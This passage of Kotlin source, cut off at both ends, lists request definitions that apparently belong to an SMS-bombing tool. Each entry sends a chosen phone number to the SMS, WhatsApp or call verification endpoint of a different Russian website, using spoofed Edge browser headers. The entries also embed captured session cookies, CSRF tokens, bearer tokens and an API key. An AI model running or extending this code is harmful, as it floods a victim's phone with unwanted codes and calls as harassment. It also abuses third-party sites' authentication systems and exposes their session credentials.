            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
            add("x-requested-with", "XMLHttpRequest")
        }

        formBody {
            add("USER_PHONE_NUMBER", phone.format("+7 (***) ***-**-**"))
            add("backurl", "/")
            add("AUTH_FORM", "Y")
            add("TYPE", "AUTH")
            add("POPUP_AUTH", "Y")
            add("AUTH_PHONE_OR_LOGIN", phone.format("+7 (***) ***-**-**"))
            add("USER_REMEMBER", "Y")
            add("Login", "Y")
        }
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://api.ucheba.ru/v1/auth/sendcode/phone"

        headers {
            add("Content-Type", "application/json")
            add("authority", "api.ucheba.ru")
            add("accept", "application/json, text/plain, */*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("cache-control", "no-cache")
            add("content-type", "application/json")
            add("origin", "https://www.ucheba.ru")
            add("referer", "https://www.ucheba.ru/")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-site")
        }

        json("{\"phone\":\"+$phone\",\"key\":\"120f0d020d070f0709080801\"}")
    },

    service(7) {
        url("https://api.gorko.ru/api/v2/auth/login") {
            addQueryParameter("socialNetwork", "phone")
            addQueryParameter("iso", "RU")
            addQueryParameter("phone", "+$phone")
        }

        headers {
            add("authority", "api.gorko.ru")
            add("accept", "*/*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add(
                "cookie",
                "PHPSESSID=978bc7fdcfe117e3628b2c91856d2f17; ab_test_venue_city_show=2; a_ref_0=; a_utm_0=%7B%7D; _ga=GA1.2.1676530931.1692806822; _gid=GA1.2.318242511.1692806822; _gat=1; _ym_uid=169280682375892820; _ym_d=1692806823; _ym_isad=2; _ga_KMYXPST6K0=GS1.2.1692806823.1.0.1692806836.0.0.0"
            )
            add("origin", "https://krasnodar.gorko.ru")
            add("referer", "https://krasnodar.gorko.ru/")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-site")
        }
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://krasnodar.wed-expert.com/api/frontend/auth/SMSAuth/get"

        headers {
            add("Content-Type", "application/x-www-form-urlencoded")
            add("authority", "krasnodar.wed-expert.com")
            add("accept", "*/*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "multipart/form-data; boundary=----WebKitFormBoundaryEBBHsgbh2CVpB9OC")
            add(
                "cookie",
                "site_session=eyJpdiI6ImZxSW85andvS3lNR0tQXC9FZHdUc1p3PT0iLCJ2YWx1ZSI6IkpmNENJcWVqcmxhdVBXVTZvc3VseDUzXC9ES2JMT0pnUE9YK05uQlZrWURDSGNTaXFBbDljRE0wUU9aZE1CVlNDIiwibWFjIjoiYzQzNWIxOTJjN2RkNWU0ZjlmM2FkZjUyZmRlYjU5ZTk3NjM1NTk5YmQyZjg4N2UyYjc0NzZlNTA5YjAyMmUwMyJ9; _ga=GA1.2.2033198891.1692806947; _gid=GA1.2.232478636.1692806947; _gat_tracker01=1; _ym_uid=1692806948478997629; _ym_d=1692806948; _ym_isad=2; _ym_visorc=w; _ga_GC92TEKMQ2=GS1.2.1692806948.1.0.1692806948.0.0.0"
            )
            add("origin", "https://krasnodar.wed-expert.com")
            add("referer", "https://krasnodar.wed-expert.com/login")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
            add("x-csrf-token", "X3vUeKs9whD2AjNdxZvNtzZAnKirMRvMNLTyliwk")
            add("x-requested-with", "XMLHttpRequest")
        }

        multipart("------WebKitFormBoundaryEBBHsgbh2CVpB9OC") {
            addFormDataPart("mobile_phone", "+$phone")
        }
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://ksdr.profi.ru/graphql"

        headers {
            add("Content-Type", "application/x-www-form-urlencoded")
            add("authority", "ksdr.profi.ru")
            add("accept", "application/json")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/json")
            add(
                "cookie",
                "city=msk; site_version=desktop; first_hit_url=%2Fcabinet%2Flogin%2F; uid=8DBABAB9C60CE664E713D79702EF8609; _ym_uid=169279815075233336; _ym_d=1692798150; _gcl_au=1.1.1741996197.1692798150; advcake_track_id=9396b886-f07a-f86e-8b51-7987eff99ef8; advcake_session_id=434d5f95-6b05-c4a6-9e3e-fc7f169348b3; _ym_isad=2; tmr_lvid=b317bb09f81d6dceefd3e74fb36e2132; tmr_lvidTS=1692798150607; _gid=GA1.2.1852101639.1692798151; _tt_enable_cookie=1; _ttp=BK4ol9a1WtQ4RpJLEtHBtxRjsmb; sid=ubq6jWTmMKWu/9TrBNyYAg==; prfr_tkn=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiZnVsbCIsInZlcnNpb24iOjEsImlkIjoiNGU4NjMyNDgtOTU0ZC00MzFmLTk5MzEtM2UzZDVhNmE2NzhiIiwic3RhdHVzIjoidG91Y2hlZCIsInNlc3Npb25JZCI6IjkwMzc5ZWIzLTQwMDEtNDRmNS04NjRkLTQxYmQ3MGJlNjFhMCIsImlhdCI6MTY5MjgwNzMzNSwiZXhwIjoxNjkyODA3OTM1LCJqdGkiOiI0ZTg2MzI0OC05NTRkLTQzMWYtOTkzMS0zZTNkNWE2YTY3OGIifQ.DBeY1RJyguRIdWuGxWFaz773M-X4dPrdy2rEebMx-6c; _ga=GA1.2.1284106746.1692798151; _gat_UA-51788549-1=1; _ga_E5EFDDJNYL=GS1.2.1692807337.2.0.1692807337.60.0.0; ets=%2Fcabinet%2Flogin%2F%2C%2C1692807340; tmr_detect=0%7C1692807339733; _ga_FRVD1KH7N7=GS1.1.1692807337.2.1.1692807340.57.0.0"
            )
            add("origin", "https://ksdr.profi.ru")
            add("referer", "https://ksdr.profi.ru/cabinet/login/")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
            add("x-app-id", "PROFI")
            add("x-new-auth-compatible", "1")
            add("x-requested-with", "XMLHttpRequest")
            add("x-wtf-id", "1430763-1692807333.879-199.132.29.299-61829")
        }

        json(
            "{\"query\":\"#prfrtkn:front:674c8b3850056b43f431415d44590346396ce839:30d6b358b6ad046bcc5c510e2159ee8fcfb2c5b9\\nquery authStrategyStart(\$type: AuthStrategyType!, \$initialState: AuthStrategyInitialState!) {\\n  authStrategyStart(type: \$type, initialState: \$initialState) {\\n    ...AuthStrategyUseResultFragment\\n  }\\n}\\n    fragment AuthStrategyUseResultFragment on AuthStrategyUseResult {\\n  strategy {\\n    strategyDescriptor\\n    stepDescriptor\\n    name\\n    type\\n  }\\n  result {\\n    __typename\\n    ... on AuthStrategyResultRetry {\\n      answer {\\n        __typename\\n        errors {\\n          __typename\\n          code\\n          message\\n          param\\n        }\\n      }\\n    }\\n    ... on AuthStrategyResultError {\\n      answer {\\n        __typename\\n        errors {\\n          __typename\\n          code\\n          message\\n          param\\n        }\\n      }\\n    }\\n    ... on AuthStrategyResultSuccess {\\n      __typename\\n      answer {\\n        __typename\\n        events {\\n          __typename\\n          ... on AuthStrategyIAnalyticEvent {\\n            type\\n          }\\n        }\\n      }\\n      auth {\\n        loginUrl\\n      }\\n      step {\\n        __typename\\n        stepId\\n        title\\n        ... on AuthStrategyStepFillPhone {\\n          phoneSuggestion\\n        }\\n        ... on AuthStrategyStepValidateMobileId {\\n          phoneNumber\\n          resendDelay\\n        }\\n        ... on AuthStrategyStepValidatePincode {\\n          phoneNumber\\n          resendDelay\\n        }\\n        ... on AuthStrategyStepFillUserInfo {\\n          requestedFields {\\n            __typename\\n            fieldId\\n            type\\n            required\\n            suggestedValue\\n          }\\n        }\\n        ... on AuthStrategyStepRequestSocNet {\\n          socNetId\\n          oAuthStateToken\\n          popupUrl\\n          windowWidth\\n          windowHeight\\n        }\\n        ... on AuthStrategyStepRequestYandex {\\n          appId\\n          scopes\\n        }\\n      }\\n    }\\n  }\\n}\",\"variables\":{\"type\":\"phone\",\"initialState\":{\"phoneNumber\":\"${
                phone.format(
                    "7 ***-***-**-**"
                )
            }\",\"defaultOrderCityId\":\"prfr\",\"currentHost\":\"https://ksdr.profi.ru\"}}}"
        )
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://www.demix.ru/api/auth/otp"

        headers {
            add("Content-Type", "application/json")
            add("Accept", "application/json, text/plain, */*")
            add("Accept-Language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("Connection", "keep-alive")
            add(
                "Cookie",
                "qrator_jsr=1692808566.473.YI4rcty6GWLxsJXj-bis9ch59pcqd20gdjjamk5e7tu0sev54-00; qrator_ssid=1692808567.073.i43n2UWINVFygzc3-l47ub8l8e506qs9i1dfnomh7jhcaain6; qrator_jsid=1692808566.473.YI4rcty6GWLxsJXj-4b5ugffs8hncmu9e2pa3shp10kjb5o03; userTastyPieDemix=fb2dc88d-2b95-421f-b0e1-6a208156aa6f; sd_srv_id=c453d198ac01bf23696f833623ef5b29; _gid=GA1.2.1419034132.1692808568; _dc_gtm_UA-3450216-16=1; _dc_gtm_UA-3450216-27=1; uxs_uid=29b27450-41d3-11ee-b765-6dbdd10a718f; tmr_lvid=0303c0f563943fb139ae45111c72c498; tmr_lvidTS=1692808568900; _ym_uid=169280857194067725; _ym_d=1692808571; _ym_isad=2; _ym_visorc=w; aplaut_distinct_id=BEypNk1zluaN; auth_state=1.1692810373367; JSESSIONID=BBB3B48C471E1117331BB5856359EA94; _ga_8ZCKPELE92=GS1.1.1692808572.1.1.1692808574.0.0.0; tmr_detect=0%7C1692808575951; _ga=GA1.2.351229370.1692808568; _ga_WJ8VR5V7NR=GS1.1.1692808572.1.1.1692808586.46.0.0"
            )
            add("Origin", "https://www.demix.ru")
            add("Referer", "https://www.demix.ru/")
            add("Sec-Fetch-Dest", "empty")
            add("Sec-Fetch-Mode", "cors")
            add("Sec-Fetch-Site", "same-origin")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
        }

        json("{\"phone\":\"${phone.format("+7 (***) ***-**-**")}\",\"communicationChannel\":\"CALL\",\"recaptchaToken\":\"\"}")
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://grass.su/local/ajax/sms.php"

        headers {
            add("Content-Type", "application/x-www-form-urlencoded")
            add("authority", "grass.su")
            add("accept", "application/json, text/javascript, */*; q=0.01")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/x-www-form-urlencoded; charset=UTF-8")
            add(
                "cookie",
                "PHPSESSID=mVbg0Gve8ZpSUL6wwgZgTyW7KjNYdA00; BITRIX_GRASS_SM_GUEST_ID=4855441; BITRIX_GRASS_SM_LAST_VISIT=23.08.2023%2019%3A46%3A18; _ym_uid=169280918017381495; _ym_d=1692809180; roistat_visit=2527695; roistat_first_visit=2527695; roistat_visit_cookie_expire=1209600; roistat_is_need_listen_requests=0; roistat_is_save_data_in_cookie=1; tmr_lvid=5dc7711dafffd005b96095c1b52089cb; tmr_lvidTS=1692809179789; BX_USER_ID=ac4f37b8c061e5da8f6e9ea3d9f6c462; _ga=GA1.1.1784252178.1692809180; _ym_isad=2; _ym_visorc=w; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A2%2C%22EXPIRE%22%3A1692824340%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; adrdel=1; adrcid=AHkoOnpaxl01IXF6nMs1BYA; roistat_cookies_to_resave=roistat_ab%2Croistat_ab_submit%2Croistat_visit; _ga_RB3M08LCKJ=GS1.1.1692809179.1.0.1692809180.0.0.0; ___dc=60fe5315-aa81-47bb-8f1f-5f334ec4c5af; tmr_detect=0%7C1692809182261"
            )
            add("origin", "https://grass.su")
            add("referer", "https://grass.su/")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
            add("x-requested-with", "XMLHttpRequest")
        }

        formBody {
            add("action", "auth-register")
            add("phone", "+$phone")
            add("sessid", "c8778b089ac52b15e1ca626f8bde5e20")
        }
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://gorchitsa.cafe/api/identity/send-whatsapp-verification-code"

        headers {
            add("Content-Type", "application/json")
            add("Accept", "application/json, text/plain, */*")
            add("Accept-Language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("Connection", "keep-alive")
            add("Cookie", "_ym_uid=1692809347201667684; _ym_d=1692809347; _ym_isad=2; _ym_visorc=w")
            add("Origin", "https://gorchitsa.cafe")
            add("Referer", "https://gorchitsa.cafe/login-by-phone")
            add("Sec-Fetch-Dest", "empty")
            add("Sec-Fetch-Mode", "cors")
            add("Sec-Fetch-Site", "same-origin")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
        }

        json("{\"phoneNumber\":\"+$phone\"}")
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://auth.deliveryguru.ru/api/v1/authorization_requests/new"

        headers {
            add("Content-Type", "application/json")
            add("authority", "auth.deliveryguru.ru")
            add("accept", "application/json")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("access-control-allow-origin", "*")
            add("content-type", "application/json;charset=UTF-8")
            add("origin", "https://yanprimus.ru")
            add("referer", "https://yanprimus.ru/")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "cross-site")
            add("x-api-key", "eMqV0{1zQ-b#Dx~TT*\$hM-gR~dR2FV6")
            add("x-app-build", "3")
            add("x-app-version", "1.1.0")
            add("x-language", "ru")
            add("x-platform", "browser")
            add("x-region-id", "38")
            add("x-user-uuid", "7528f6a5-3739-46de-a394-af14018f90ce")
        }

        json("{\"phone\":\"$phone\",\"js_captcha_key\":\"fb767236-19f7-4bc6-bf0a-a5a4a25bc742\",\"use_re_captcha\":false,\"captcha_token\":null,\"client_id\":\"b5bc23c8-6239-a87f-bb79-4ec8705ca0e2\"}")
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://kanzler-style.ru/local/components/kanzler/form.auth/tools/ajax.php"

        headers {
            add("Content-Type", "application/x-www-form-urlencoded")
            add("authority", "kanzler-style.ru")
            add("accept", "application/json, text/javascript, */*; q=0.01")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/x-www-form-urlencoded; charset=UTF-8")
            add(
                "cookie",
                "__ddg1_=V1Cc8JwZ8mRJOSfIzicY; PHPSESSID=LqEV4zYAGEWntvetcrR5i4idm7ARHcpX; BITRIX_SM_GUEST_ID=7628928; BITRIX_SM_SALE_UID=135404911; rrpvid=701237728037063; _gcl_au=1.1.975023723.1692810772; gdeslon.ru.__arc_domain=gdeslon.ru; gdeslon.ru.user_id=69a3d474-8b1e-42ac-97ef-4f5337e6ed1b; tmr_lvid=8866318171b2c0f509ba9b2254a22f36; tmr_lvidTS=1692810771710; advcake_track_id=72fb0c52-32be-f259-59cd-3e2b63d1592f; advcake_session_id=c1eda9cb-7649-f8b2-37d4-65cdaf28ea19; rcuid=64bff15d833c6767f1bdb21e; _ga_WZNPJG3ETF=GS1.1.1692810771.1.0.1692810771.0.0.0; _ga=GA1.2.1011640044.1692810772; _gid=GA1.2.359694038.1692810772; flocktory-uuid=eee2e340-be6c-4aa8-9839-be8599b4ef75-1; _gpVisits={\"isFirstVisitDomain\":true,\"idContainer\":\"100024BA\"}; _ym_uid=1692810773283718354; _ym_d=1692810773; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A1%2C%22EXPIRE%22%3A1692824340%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ym_isad=2; roistat_visit=2813319; roistat_first_visit=2813319; roistat_visit_cookie_expire=1209600; roistat_is_need_listen_requests=0; roistat_is_save_data_in_cookie=1; _ym_visorc=w; city_suggested=1; roistat_cookies_to_resave=roistat_ab%2Croistat_ab_submit%2Croistat_visit; analytic_id=1692810774219092; ___dc=95a95478-3138-49b9-b975-21ad220eb227; tmr_detect=0%7C1692810775088; mindboxDeviceUUID=b5025119-1451-4b77-bc8a-7b0986de9ce7; directCrm-session=%7B%22deviceGuid%22%3A%22b5025119-1451-4b77-bc8a-7b0986de9ce7%22%7D; BITRIX_SM_LAST_VISIT=23.08.2023%2020%3A13%3A01; _gp100024BA={\"hits\":1,\"vc\":1,\"ac\":1}"
            )
            add("origin", "https://kanzler-style.ru")
            add("referer", "https://kanzler-style.ru/")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
            add("x-requested-with", "XMLHttpRequest")
        }

        formBody {
            add("key", "6b1218626d9af643ded9234905bc56af")
            add("form", "phone")
            add("data[phone]", phone.format("+7 *** ***-**-**"))
            add("data[number_status]", "1")
        }
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://ap.leomax.ru/siteapi/auth/authcode"

        headers {
            add("Content-Type", "application/json")
            add("Accept", "application/json, text/plain, */*")
            add("Accept-Language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add(
                "Authorization",
                "Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjEiLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiIyNDVjNGRjMy1iNmY2LTQxOTctOWMxMS1jMjczYWRhNDFlNWMiLCJhbm9ueW1vdXMiOiJUcnVlIiwic2lkIjoiMGI5N2I2ODUtNTc4Zi00MTVkLWI4ZmYtMjcyMDlkNDcyMmIxIiwiZGV2aWNlaWQiOiIwZjNkNWFkYmQxMmY0OGY2MDhiYTI3YjE2ZThlZTgzZCIsInR5cGUiOiJBY2Nlc3MiLCJleHAiOjE2OTI4MTg0NjgsImlzcyI6ImFwLmxlb21heC5ydSIsImF1ZCI6ImFwLmxlb21heC5ydSJ9.he5sEtVUZzWF2um3xjGcyy87gZAtMGMmn-fbmlMRFsPAKd6DpDfLT_NDS5wIMY4ZwOifGHHqXI-gwwMWN9E3Uw"
            )
            add("Connection", "keep-alive")
            add(
                "$Cookie",
                "__ddg1_=F4DoII2mqHkxq1CJjQ6R; digi_uc=W10=; _gid=GA1.2.430914141.1692811264; _gat_UA-55318952-1=1; _gat_UA-56721552-1=1; _ga_VVTX7KM892=GS1.1.1692811264.1.0.1692811264.0.0.0; _ga_JL7GJBGZYH=GS1.1.1692811264.1.0.1692811264.60.0.0; _ym_uid=1692811266512446147; _ym_d=1692811266; call_s=%3C\u0021%3E%7B%22qo1q7a6x%22%3A%5B1692813066%2C1868163775%2C%7B%22258661%22%3A%22782951%22%7D%5D%2C%22d%22%3A2%7D%3C\u0021%3E; _ym_isad=2; deviceId=0f3d5adbd12f48f608ba27b16e8ee83d; _ym_visorc=b; token=eyJhbGciOiJSUzI1NiIsImtpZCI6IjEiLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiIyNDVjNGRjMy1iNmY2LTQxOTctOWMxMS1jMjczYWRhNDFlNWMiLCJhbm9ueW1vdXMiOiJUcnVlIiwic2lkIjoiMGI5N2I2ODUtNTc4Zi00MTVkLWI4ZmYtMjcyMDlkNDcyMmIxIiwiZGV2aWNlaWQiOiIwZjNkNWFkYmQxMmY0OGY2MDhiYTI3YjE2ZThlZTgzZCIsInR5cGUiOiJBY2Nlc3MiLCJleHAiOjE2OTI4MTg0NjgsImlzcyI6ImFwLmxlb21heC5ydSIsImF1ZCI6ImFwLmxlb21heC5ydSJ9.he5sEtVUZzWF2um3xjGcyy87gZAtMGMmn-fbmlMRFsPAKd6DpDfLT_NDS5wIMY4ZwOifGHHqXI-gwwMWN9E3Uw; _ga=GA1.2.1189500148.1692811264; advcake_track_id=5517fb8e-161d-446c-32bc-5dc01dcea974; advcake_session_id=ce22516d-06ed-b3ec-340a-5be579f04a17; tmr_lvid=eaa019c9cd0fda1b4e96fd9086bbb3f2; tmr_lvidTS=1692811267948; mindboxDeviceUUID=b5025119-1451-4b77-bc8a-7b0986de9ce7; directCrm-session=%7B%22deviceGuid%22%3A%22b5025119-1451-4b77-bc8a-7b0986de9ce7%22%7D; amp_ff4b07=pUpDTWQPR2xO3qrctNkhsA...1h8hmk40n.1h8hmk40p.1.0.1; gdeslon.ru.__arc_domain=gdeslon.ru; gdeslon.ru.user_id=69a3d474-8b1e-42ac-97ef-4f5337e6ed1b; adrdel=1; adrcid=AsGXPw72xaAmzw4prRCyJyA; analytic_id=1692811268793615"
            )
            add("Origin", "https://auth.leomax.ru")
            add("Referer", "https://auth.leomax.ru/")
            add("Sec-Fetch-Dest", "empty")
            add("Sec-Fetch-Mode", "cors")
            add("Sec-Fetch-Site", "same-site")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
        }

        json("{\"phone\":\"+$phone\"}")
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://www.puhovik.ru/api/v2/user/phone/code/send/"

        headers {
            add("Content-Type", "application/x-www-form-urlencoded")
            add("authority", "www.puhovik.ru")
            add("accept", "application/json, text/javascript, */*; q=0.01")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/x-www-form-urlencoded; charset=UTF-8")
            add(
                "cookie",
                "PHPSESSID=orGs1P66KnAfcOWyJtDzKDVbSn4TfRXU; PUHOVIK_SM_BXMAKER_AUP_GID=7398267; PUHOVIK_SM_SALE_UID=741abdb44b3501755c8addf62ab905eb; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A1%2C%22EXPIRE%22%3A1692824340%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; tmr_lvid=46adc48f52cd5784f39decad56744ab1; tmr_lvidTS=1692811437330; _ym_uid=1692811438948499062; _ym_d=1692811438; _ym_isad=2; _ga=GA1.2.1591604241.1692811438; _gid=GA1.2.1005242415.1692811438; _gat_gtag_UA_8073141_6=1; _ym_visorc=w; BX_USER_ID=ac4f37b8c061e5da8f6e9ea3d9f6c462; tmr_detect=0%7C1692811439954; _ga_2GYWV5WC0N=GS1.1.1692811437.1.0.1692811452.45.0.0"
            )
            add("origin", "https://www.puhovik.ru")
            add("referer", "https://www.puhovik.ru/auth/")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
            add("x-requested-with", "XMLHttpRequest")
        }

        formBody {
            add("phone", phone.toString())
            add("place", "lk")
        }
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://ralf.ru/local/ajax/loymax.php"

        headers {
            add("Content-Type", "application/x-www-form-urlencoded")
            add("authority", "ralf.ru")
            add("accept", "application/json, text/javascript, */*; q=0.01")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/x-www-form-urlencoded; charset=UTF-8")
            add(
                "cookie",
                "is_mobile=0; PHPSESSID=7b0128d7d7e3c83e1bf4212ec7202d21; BITRIX_SM_SALE_UID=486046781; gcui=; gcmi=; gcvi=F9Vl6hYL5Oz; gcsi=JTHdIJQZiR2; st_uid=319f436c3cf3b49c94013182a26568fc; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A2%2C%22EXPIRE%22%3A1692824340%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; rrpvid=789378172196006; tzr_permission=yes; tmr_lvid=a38b919a182cda9d5210c8a2ca927f2f; tmr_lvidTS=1692811614151; BX_USER_ID=ac4f37b8c061e5da8f6e9ea3d9f6c462; rcuid=64bff15d833c6767f1bdb21e; _userGUID=0:llo0btfy:XAOKoG5gBJrwociDXW71JeJEWosufnyO; dSesn=e97ceb77-a437-f1d8-1d7e-06de0217972a; _dvs=0:llo0btfy:GG4xHG~iSfO~GjLVkmSfEPz9ma03tWjQ; _ga=GA1.2.886974117.1692811614; _gid=GA1.2.496366897.1692811615; _gat_test1=1; _gat_UA-4318159-1=1; _ym_uid=1692811615168731442; _ym_d=1692811615; _dc_gtm_UA-236052710-1=1; _dc_gtm_UA-4318159-1=1; _ym_isad=2; rrwpswu=true; _ym_visorc=w; adrdel=1; adrcid=A1OSIWEH4_QJsAncyLrX5Mg; tzr_id=api05-4d14209f-6e23-45d9-be5c-dabf70810110; tmr_detect=0%7C1692811618177; _ga_E2S7R23DWN=GS1.1.1692811614.1.0.1692811622.0.0.0; _ga_YMQKRJSNG3=GS1.1.1692811614.1.0.1692811622.0.0.0; _ga_CL6FX7FZPG=GS1.2.1692811616.1.0.1692811622.54.0.0; _ga_T2W7CBPC1Y=GS1.1.1692811614.1.0.1692811622.0.0.0"
            )
            add("origin", "https://ralf.ru")
            add("referer", "https://ralf.ru/")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
            add("x-requested-with", "XMLHttpRequest")
        }

        formBody {
            add("phoneNumber", phone.format("+7 (***) ***-**-**"))
            add("action", "getCode")
        }
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://loverepublic.ru/api/user/auth"

        headers {
            add("Content-Type", "application/json")
            add("authority", "loverepublic.ru")
            add("accept", "application/json")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("authorization", "Bearer 213fd29a834170b100945afcd54ef5989e876ef0a5f02e79f9c2b2a05b5cffbe")
            add("content-type", "application/json")
            add(
                "cookie",
                "republic-token=213fd29a834170b100945afcd54ef5989e876ef0a5f02e79f9c2b2a05b5cffbe; _gcl_au=1.1.1778099947.1692811708; tmr_lvid=a3d32ca11f7f46756098e33d0f6e3e24; tmr_lvidTS=1692811709942; flocktory-uuid=ecd5774d-54ef-463b-b2ca-df9b6bd3168c-9; _ga_9K5KJZV4SF=GS1.1.1692811712.1.0.1692811712.0.0.0; _ga=GA1.2.1397753970.1692811712; _gid=GA1.2.1274602606.1692811713; _gat_UA-38279415-2=1; _ym_uid=1692811714324957095; _ym_d=1692811714; uxs_uid=7c72fa50-41da-11ee-b2d0-f3c631581420; _ym_isad=2; _ym_visorc=w; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; tmr_detect=0%7C1692811715805; mindboxDeviceUUID=b5025119-1451-4b77-bc8a-7b0986de9ce7; directCrm-session=%7B%22deviceGuid%22%3A%22b5025119-1451-4b77-bc8a-7b0986de9ce7%22%7D; republic-location=%D0%9E%D1%80%D0%B5%D0%BD%D0%B1%D1%83%D1%80%D0%B3; undefined=confirmed"
            )
            add("origin", "https://loverepublic.ru")
            add("referer", "https://loverepublic.ru/catalog/shoes/")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
